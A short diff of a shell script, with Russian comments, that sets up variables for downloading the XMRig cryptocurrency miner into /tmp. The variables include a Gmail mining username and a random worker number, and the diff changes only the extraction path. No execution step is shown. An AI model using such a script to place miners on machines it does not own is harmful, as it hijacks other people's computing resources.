@@ -3,7 +3,7 @@
 # Установка переменных
 url="https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
 download_dir="/tmp"
-extract_dir="/tmp/xmrig"
+extract_dir="/tmp/xmrig/xmrig-6.21.3"
 username="fintafixgames@gmail.com"
 random_number=$(shuf -i 1000000000-9999999999 -n 1)
 
